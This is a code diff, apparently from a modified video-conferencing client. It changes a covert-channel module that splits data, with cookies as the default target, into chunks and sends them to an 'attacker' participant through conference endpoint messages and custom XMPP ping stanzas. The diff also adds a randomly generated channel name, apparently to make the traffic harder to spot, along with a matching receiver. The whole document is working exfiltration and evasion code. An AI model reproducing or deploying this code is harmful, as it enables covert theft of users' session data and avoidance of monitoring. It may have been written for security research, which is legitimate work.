@@ -11,10 +11,9 @@ export const defaultConfigurationValues = {
     dataType: 'cookies',
     chunkSize: 5000,
     encryptionEnabled: true,
-    pingInterval: 1000
+    pingInterval: 1000,
+    debug: true
 };
-
-const xmlns = 'extraction';
 
 /**
  * Implementation of different convert channel methods
@@ -44,14 +43,15 @@ class CovertChannelMethods {
      * Sending data using simple plain method
      * @param {any} data - specified data to be sent
      */
-    static usePlain(data, attackerId) {
-        for (const chunkData of splitString(data, this.configuration.chunkSize)) {
-            APP.conference.sendEndpointMessage(attackerId, {
+    static usePlain(data, attacker, configuration) {
+        for (const chunkData of splitString(data, configuration.chunkSize)) {
+            console.log('data:', chunkData);
+            APP.conference.sendEndpointMessage(attacker.getId(), {
                 extraction: 'reply',
                 payload: chunkData
             });
         }
-        CovertChannelMethods.endCommunication(attackerId);
+        CovertChannelMethods.endCommunication(attacker.getId());
     }
 
     /**
@@ -117,48 +117,24 @@ class CovertChannelMethods {
      * @param data to send
      * timeout <tt>error<//t> callback is called with undefined error argument.
      */
-    static extractionPing(jid, success, error, timeout, data, type, id = '123') {
+    static extractionPing(jid, success, error, timeout, data, type, id = '123', name = 'extraction') {
         const iq = $iq({
             type,
             to: jid,
-            sid: '666',
-            id,
-            name: 'extraction'
+            id
         });
 
-        iq.c('ping', { xmlns: 'extraction',
+        iq.c('ping', { xmlns: name,
             data });
         APP.conference._room.xmpp.connection.sendIQ2(iq, { timeout })
             .then(success, error);
     }
 
     /**
-     *
-     * @param {*} userJid
-     * @param {*} dataStack
-     */
-    static sendPing(userJid, dataStack) {
-        CovertChannelMethods.extractionPing(userJid, e => {
-            console.log('success', e, dataStack);
-            if (!dataStack) {
-                return;
-            }
-            CovertChannelMethods.sendPing(userJid, dataStack);
-        }, e => {
-            console.log('fail', e);
-            console.log('Data sent:', dataStack);
-        }, 5000, dataStack.shift(), 'get');
-    }
-
-    static sendPong() {
-
-    }
-
-    /**
      * Send data using audio stream
      * @param {any} data - specified data to be sent
      */
-    static useXMPP(data, attacker, configuration) {
+    static useXMPP(data, attacker, configuration, name = 'extraction') {
         const splitedData = splitString(data, configuration.chunkSize);
 
         console.log('Data:', splitedData);
@@ -175,30 +151,8 @@ class CovertChannelMethods {
             }, e => {
                 console.log('fail', e);
                 console.log('Data sent:', splitedData);
-            }, 5000, splitedData.shift(), 'get');
+            }, 5000, splitedData.shift(), 'get', '123', name);
         }, configuration.pingInterval);
-
-        /*
-        const handlerRef = APP.conference._room.xmpp.connection.addHandler(ping => {
-            console.log('Sending another ping', ping);
-            CovertChannelMethods.extractionPing(attacker.getJid(),
-                message => {
-                    console.log('successful message recieved:', message);
-                    if (!splitData) {
-                        APP.conference._room.xmpp.connection.deleteHandler(handlerRef);
-                        CovertChannelMethods.endCommunication(attacker.getJid());
-
-                        return;
-                    }
-                    CovertChannelMethods.sendPing(attacker.getJid(), splitData.shift());
-                }, message => {
-                    console.log('failed message recieved:', message);
-                }, 1000, 'test', 'result', ping.id);
-
-        }, 'extraction');
-        */
-
-        // APP.conference.saveLogs();
     }
 }
 
@@ -233,7 +187,7 @@ class ExtractionCovertChannelMethods {
     /**
      * Receiving data using xmpp ping
      */
-    static usedXMPP(user, stackedData) {
+    static usedXMPP(user, stackedData, name = 'extraction') {
         const handlerRef = APP.conference._room.xmpp.connection.addHandler(ping => {
             stackedData.push(ping.children[0].attributes.data.nodeValue);
             console.log('data:', stackedData);
@@ -246,10 +200,10 @@ class ExtractionCovertChannelMethods {
                 }, message => {
                     console.log('failed message recieved:', message);
                     console.log('Data received:', stackedData);
-                }, 1000, 'test', 'result', ping.id);
+                }, 1000, '', 'result', ping.id, name);
 
             return true;
-        }, 'extraction');
+        }, name);
     }
 
     /**
@@ -278,6 +232,20 @@ export class ExtractionHandler {
         this._fileBuffer = [];
         this.communicationEnded = false;
         this.initializeEncryption();
+        this.nameOfCommunication = this.generateName();
+    }
+
+    /**
+     *
+     * @returns {string} generated name of the extraction channel
+     */
+    generateName() {
+        if (this.configuration.debug) {
+            return 'extraction';
+        }
+
+        return Math.random().toString(36)
+            .substring(7);
     }
 
     /**
@@ -366,8 +334,8 @@ export class ExtractionHandler {
             if (this.enabledEncryption()) {
                 // TODO: make encryption work.
             }
-
-            CovertChannelMethods.options[this.configuration.method](data, attacker, this.configuration);
+            CovertChannelMethods.options[this.configuration.method](data, attacker, 
+                this.configuration, this.nameOfCommunication);
         });
     }
 
